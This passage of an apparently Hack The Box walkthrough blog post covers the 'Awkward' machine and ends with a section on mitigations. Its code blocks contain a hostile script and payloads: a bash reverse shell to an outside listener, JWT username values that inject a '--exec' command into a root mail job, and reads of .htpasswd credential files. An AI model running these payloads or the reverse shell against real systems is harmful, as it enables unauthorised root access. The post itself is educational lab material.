</pre></td><td class="rouge-code"><pre>www-data@awkward:/home/bean<span class="nv">$ </span><span class="nb">cat</span> /etc/nginx/sites-enabled/store.conf
server <span class="o">{</span>
    listen       80<span class="p">;</span>
    server_name  store.hat-valley.htb<span class="p">;</span>
    root /var/www/store<span class="p">;</span>

    location / <span class="o">{</span>
        index index.php index.html index.htm<span class="p">;</span>
    <span class="o">}</span>
    <span class="c"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span>
    <span class="c">#</span>
    location ~ /cart/.<span class="k">*</span><span class="se">\.</span>php<span class="nv">$ </span><span class="o">{</span>
        <span class="k">return </span>403<span class="p">;</span>
    <span class="o">}</span>
    location ~ /product-details/.<span class="k">*</span><span class="se">\.</span>php<span class="nv">$ </span><span class="o">{</span>
        <span class="k">return </span>403<span class="p">;</span>
    <span class="o">}</span>
    location ~ <span class="se">\.</span>php<span class="nv">$ </span><span class="o">{</span>
        auth_basic <span class="s2">"Restricted"</span><span class="p">;</span>
        auth_basic_user_file /etc/nginx/conf.d/.htpasswd<span class="p">;</span>
        fastcgi_pass   unix:/var/run/php/php8.1-fpm.sock<span class="p">;</span>
        fastcgi_index  index.php<span class="p">;</span>
        fastcgi_param  SCRIPT_FILENAME  <span class="nv">$realpath_root$fastcgi_script_name</span><span class="p">;</span>
        include        fastcgi_params<span class="p">;</span>
    <span class="o">}</span>
    <span class="c"># deny access to .htaccess files, if Apache's document root</span>
    <span class="c"># concurs with nginx's one</span>
    <span class="c">#</span>
    <span class="c">#location ~ /\.ht {</span>
    <span class="c">#    deny  all;</span>
    <span class="c">#}</span>
<span class="o">}</span>

www-data@awkward:/home/bean<span class="nv">$ </span><span class="nb">cat</span> /etc/nginx/conf.d/.htpasswd
admin:<span class="nv">$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The credentials to access the store were in a .htpasswd file. I had the username, but hashcat failed to break the password hash. I tried login in with all the passwords I had found so far, but still no luck.</p>

<p>I downloaded <a href="https://github.com/DominicBreuker/pspy">pspy</a> on the server to look at running processes.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32317  | /usr/sbin/CRON <span class="nt">-f</span> <span class="nt">-P</span>
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32335  | /usr/sbin/postdrop <span class="nt">-r</span>
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32334  | /usr/sbin/sendmail <span class="nt">-FCronDaemon</span> <span class="nt">-i</span> <span class="nt">-B8BITMIME</span> <span class="nt">-oem</span> root
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32328  | mail <span class="nt">-s</span> Leave Request: bean.hill christine
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32336  | /usr/sbin/sendmail <span class="nt">-oi</span> <span class="nt">-f</span> root@awkward <span class="nt">-t</span>
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32337  | /usr/sbin/sendmail <span class="nt">-oi</span> <span class="nt">-f</span> root@awkward <span class="nt">-t</span>
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32338  | cleanup <span class="nt">-z</span> <span class="nt">-t</span> unix <span class="nt">-u</span> <span class="nt">-c</span>
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32339  | trivial-rewrite <span class="nt">-n</span> rewrite <span class="nt">-t</span> unix <span class="nt">-u</span> <span class="nt">-c</span>
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32340  | <span class="nb">local</span> <span class="nt">-t</span> unix
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>???  <span class="nv">PID</span><span class="o">=</span>32344  | ???
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32342  |
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32346  | /bin/bash /root/scripts/notify.sh
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32347  | /usr/lib/postfix/sbin/master <span class="nt">-w</span>
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32348  | /usr/sbin/sendmail <span class="nt">-oi</span> <span class="nt">-f</span> root@awkward <span class="nt">-t</span>
2023/01/15 04:00:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>32349  | /usr/sbin/postdrop <span class="nt">-r</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The mail command looked interesting, but it was running as root. And at that time I was trying to get in as bean or christine. So I took a note and left it aside.</p>

<p>I went back to the backup and looked deeper into the hidden folders. Eventually, I came across what looked like the auto-save file for <a href="https://wiki.gnome.org/Apps/Xpad">Xpad</a>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>www-data@awkward:/tmp/test<span class="nv">$ </span><span class="nb">cat</span> .config/xpad/content-DS1ZS1
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism <span class="k">for </span>HR system
- Setup better confirmation message when adding item to cart
- Add support <span class="k">for </span>item quantity <span class="o">&gt;</span> 1
- Implement checkout system

ÓÄÄboldÓÄÄHR SYSTEMÓÄÄ/boldÓÄÄ
bean.hill
REDACTED

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

ÓÄÄboldÓÄÄMAKE SURE TO USE THIS EVERYWHERE ^^^ÓÄÄ/boldÓÄÄ
</pre></td></tr></tbody></table></code></div></div>

<p>It contained a password and a bolded note to use it everywhere. I used it to connect to the store.</p>

<p><img data-src="/assets/images/Awkward/Store.png" alt="Store" title="Store" data-proofer-ignore></p>

<p>And to SSH.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ssh bean@target
bean@target<span class="s1">'s password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sun Oct 23 21:38:08 2022 from 10.10.14.6
bean@awkward:~$ ls -la
total 84
drwxr-xr-x 17 bean bean 4096 Oct  6 01:35 .
drwxr-xr-x  4 root root 4096 Oct  5 02:46 ..
lrwxrwxrwx  1 bean bean    9 Sep 15 21:40 .bash_history -&gt; /dev/null
-rw-r--r--  1 bean bean  220 Sep 15 21:34 .bash_logout
-rw-r--r--  1 bean bean 3847 Sep 15 21:45 .bashrc
drwx------  9 bean bean 4096 Sep 22 14:30 .cache
drwx------ 13 bean bean 4096 Oct  6 01:35 .config
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Desktop
drwxr-xr-x  3 bean bean 4096 Sep 15 21:46 Documents
drwxr-xr-x  2 bean bean 4096 Sep 15 23:03 Downloads
drwx------  2 bean bean 4096 Sep 22 14:24 .gnupg
drwx------  3 bean bean 4096 Sep 15 21:35 .local
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Music
drwxrwxr-x  4 bean bean 4096 Oct  6 01:35 .npm
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Pictures
-rw-r--r--  1 bean bean  807 Sep 15 21:34 .profile
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Public
drwx------  4 bean bean 4096 Sep 15 21:55 snap
drwx------  2 bean bean 4096 Sep 15 21:36 .ssh
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Templates
-rw-r-----  1 root bean   33 Jan 14 23:22 user.txt
drwxr-xr-x  2 bean bean 4096 Sep 15 21:35 Videos

bean@awkward:~$ cat user.txt
REDACTED
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Once connected as bean, I thought I needed to find a way to access the user christine. I looked at sudo, suid, cronjobs, ‚Ä¶ I did not find anything.</p>

<p>I read the source code of the store application. It had similar code to deny the use of some characters. And it was using <code class="language-plaintext highlighter-rouge">sed</code> in the code to remove items from the cart.</p>

<p>I saw that I could create new products by adding files to the <code class="language-plaintext highlighter-rouge">product-details</code> folder. So I thought maybe I could inject code in there, and get it executed when <code class="language-plaintext highlighter-rouge">sed</code> was called. But the application was running as www-data, so I left that aside and looked for other things.</p>

<h3 id="email-sending"><span class="mr-2">Email Sending</span><a href="#email-sending" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I ran pspy again, and the process that sent the emails keep coming back.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4201   | /usr/sbin/sendmail <span class="nt">-oi</span> <span class="nt">-f</span> root@awkward <span class="nt">-t</span> 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4204   | /usr/sbin/postdrop <span class="nt">-r</span> 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4203   | /usr/sbin/postdrop <span class="nt">-r</span> 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4202   | /usr/sbin/sendmail <span class="nt">-FCronDaemon</span> <span class="nt">-i</span> <span class="nt">-B8BITMIME</span> <span class="nt">-oem</span> root 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4205   | cleanup <span class="nt">-z</span> <span class="nt">-t</span> unix <span class="nt">-u</span> <span class="nt">-c</span> 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4206   | trivial-rewrite <span class="nt">-n</span> rewrite <span class="nt">-t</span> unix <span class="nt">-u</span> <span class="nt">-c</span> 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4207   | /bin/bash /root/scripts/notify.sh 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4212   | mail <span class="nt">-s</span> Leave Request: bean.hill christine 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4214   | <span class="nb">local</span> <span class="nt">-t</span> unix 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4213   | cleanup <span class="nt">-z</span> <span class="nt">-t</span> unix <span class="nt">-u</span> <span class="nt">-c</span> 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4215   | /usr/sbin/sendmail <span class="nt">-oi</span> <span class="nt">-f</span> root@awkward <span class="nt">-t</span> 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4217   | <span class="nb">local</span> <span class="nt">-t</span> unix 
2023/01/16 00:40:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4216   | /usr/sbin/postdrop <span class="nt">-r</span> 
</pre></td></tr></tbody></table></code></div></div>

<p>It took me a while, but eventually, I realized that the subject of the email contained the username of the requester (Leave Request: bean.hill christine), and that I could control that.</p>

<p>When I first got a shell on the machine, I found the <code class="language-plaintext highlighter-rouge">TOKEN_SECRET</code> that was used to generate JWT. I took my token to <a href="https://jwt.io/">jwt.io</a> to confirm that it worked.</p>

<p><img data-src="/assets/images/Awkward/SignatureVerified.png" alt="Signature Verified" title="Signature Verified" data-proofer-ignore></p>

<p>I tried generating a token with a fake name to see if it would be used in the mail command. I used Burp to send a leave request with my new token and checked what was executed on the server.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>2023/01/16 01:02:46 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>4320   | mail <span class="nt">-s</span> Leave Request: ERIC_WAS_HERE christine
</pre></td></tr></tbody></table></code></div></div>

<p>It worked! Next, I tried to send some code to execute.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">";`id`;ls"</span><span class="p">],</span><span class="w">
  </span><span class="nl">"iat"</span><span class="p">:</span><span class="w"> </span><span class="mi">1673727191</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<p>I sent a username with some commands to execute. The <code class="language-plaintext highlighter-rouge">id</code> was run, but on insertion by www-data. Not by root when sending the email. So that did not help.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>mail <span class="nt">-s</span> Leave Request: <span class="p">;</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span><span class="p">;</span><span class="nb">ls </span>christine
</pre></td></tr></tbody></table></code></div></div>

<p>I needed something that would be executed by mail, not the web server. I found on GTFOBins that <a href="https://gtfobins.github.io/gtfobins/mail/#shell">mail</a> could be used to run commands.</p>

<p>I struggled a lot to get the payload executed. In the end, I had to double-encode everything, and start with a single <code class="language-plaintext highlighter-rouge">"</code>.</p>

<p>I created a script on the server and made it executable.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>bean@awkward:~<span class="nv">$ </span><span class="nb">cat</span> /tmp/test.sh
<span class="c">#!/bin/bash</span>

bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then I sent a username that would use <code class="language-plaintext highlighter-rouge">--exec</code> on the mail command to run the script.</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"</span><span class="se">\\\"</span><span class="s2"> --exec=</span><span class="se">\\\"\\</span><span class="s2">!/tmp/test.sh</span><span class="se">\\\"</span><span class="s2">"</span><span class="p">],</span><span class="w">
  </span><span class="nl">"iat"</span><span class="p">:</span><span class="w"> </span><span class="mi">1673727191</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>
<p>I sent a new request with the generated JWT and I got a hit on my listener.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.185] 35700
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>946<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell

root@awkward:~/scripts# <span class="nb">whoami
whoami
</span>root

root@awkward:~/scripts# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
REDACTED
</pre></td></tr></tbody></table></code></div></div>

<p>After I finally got root, I realized that I could have done the same when I got the shell as www-data. The file used to store the leave requests is writable by www-data. So I could add the command to the file and get my shell.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">' " --exec="!/tmp/test.sh"'</span> <span class="o">&gt;&gt;</span> /var/www/private/leave_requests.csv
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mitigations"><span class="mr-2">Mitigations</span><a href="#mitigations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>This box was made vulnerable by a series of mistakes, mostly in the main application.</p>

<p>The source maps are great for developers, but they should not be available in production. They also make life easier for hackers.</p>

<p>The token validation was problematic. If the token was not set to <code class="language-plaintext highlighter-rouge">guest</code>, then I could access pages that should have been protected. The code should always validate the full token and reject any requests with an invalid token.</p>

<p>The API endpoint to check the store status had no reason to take a URL parameter. The developers should know where the store would be. If they need multiple URLs for different environments, that could be stored in an environment variable instead of allowing the users to query anything they want.</p>

<p>The <code class="language-plaintext highlighter-rouge">staff-details</code> endpoint was problematic.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/staff-details</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">user_token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">token</span>
  <span class="kd">var</span> <span class="nx">authFailed</span> <span class="o">=</span> <span class="kc">false</span>
  <span class="nf">if</span><span class="p">(</span><span class="nx">user_token</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">decodedToken</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">verify</span><span class="p">(</span><span class="nx">user_token</span><span class="p">,</span> <span class="nx">TOKEN_SECRET</span><span class="p">)</span>
    <span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="nx">decodedToken</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">authFailed</span> <span class="o">=</span> <span class="kc">true</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nf">if</span><span class="p">(</span><span class="nx">authFailed</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span><span class="na">Error</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid Token</span><span class="dl">"</span><span class="p">})</span>
  <span class="p">}</span>
  <span class="nx">connection</span><span class="p">.</span><span class="nf">query</span><span class="p">(</span>
    <span class="dl">'</span><span class="s1">SELECT * FROM users</span><span class="dl">'</span><span class="p">,</span>
    <span class="nf">function </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">results</span><span class="p">)</span> <span class="p">{</span>
      <span class="nf">if</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Database error</span><span class="dl">"</span><span class="p">)</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">json</span><span class="p">(</span><span class="nx">results</span><span class="p">)</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">);</span>
<span class="p">})</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If <code class="language-plaintext highlighter-rouge">user_token</code> was not defined, then <code class="language-plaintext highlighter-rouge">authFailed</code> stayed false and we could access all the users. In authentication code, the default should always be a failure until proven that the authentication is successful. This way call is rejected in the case of a forgotten path like here.</p>

<p>Sending the data directly from the database is a bad idea. The code should go through the users and only send the fields that are needed. This way you don‚Äôt risk sending sensitive data like the password hashes, even if it‚Äôs added after the code was written.</p>

<p>The way the leave requests were stored also has issues. The code uses the command line to echo the entries in a file and read them. Passing user-supplied values to the command line is always risky. The code tries to reject some characters, but that‚Äôs clearly not enough. Validating the types of the arguments would have helped.</p>

<p>The application already has a database to store users. Why not use it for leave requests also? And if the requests needed to be stored in a file, why not use the Node methods to read and write to files?</p>

<p>Once connected, I was able to read the backup of another user. Backups can contain sensitive data and should be protected. The file should not be readable by anyone but the owner. And maybe they could be encrypted.</p>

<p>There was also an issue with bean‚Äôs password. They entered it in a clear text document. Xpad saved it in clear. I don‚Äôt know it that was an auto-save file, or where it saves all the notes, but passwords cannot be entered in an unencrypted document. And they should not be reused.</p>

<p>The last problem was with the code that sent the email when a new leave request was added.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>root@awkward:~/scripts# <span class="nb">cat </span>notify.sh
<span class="nb">cat </span>notify.sh
<span class="c">#!/bin/bash</span>

inotifywait <span class="nt">--quiet</span> <span class="nt">--monitor</span> <span class="nt">--event</span> modify /var/www/private/leave_requests.csv | <span class="k">while </span><span class="nb">read</span><span class="p">;</span> <span class="k">do
        </span><span class="nv">change</span><span class="o">=</span><span class="si">$(</span><span class="nb">tail</span> <span class="nt">-1</span> /var/www/private/leave_requests.csv<span class="si">)</span>
        <span class="nv">name</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$change</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="sb">`</span>
        <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"You have a new leave request to review!</span><span class="se">\n</span><span class="nv">$change</span><span class="s2">"</span> | mail <span class="nt">-s</span> <span class="s2">"Leave Request: "</span><span class="nv">$name</span> christine
</pre></td></tr></tbody></table></code></div></div>

<p>Once again, user‚Äôs data is used in a command. This code probably takes for granted that the data was sanitized by the code that wrote it to the file. But you should always sanitize the inputs where you use them. Don‚Äôt trust other code to do it for you. You never know how it can be bypassed.</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/walkthrough/"
          class="post-tag no-text-decoration" >Walkthrough</a>
      
      <a href="/tags/hacking/"
          class="post-tag no-text-decoration" >Hacking</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >HackTheBox</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >Medium</a>
      
      <a href="/tags/machine/"
          class="post-tag no-text-decoration" >Machine</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+Walkthrough+-+Awkward+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Awkward%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+Walkthrough+-+Awkward+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Awkward%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Awkward%2F&text=Hack+The+Box+Walkthrough+-+Awkward+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
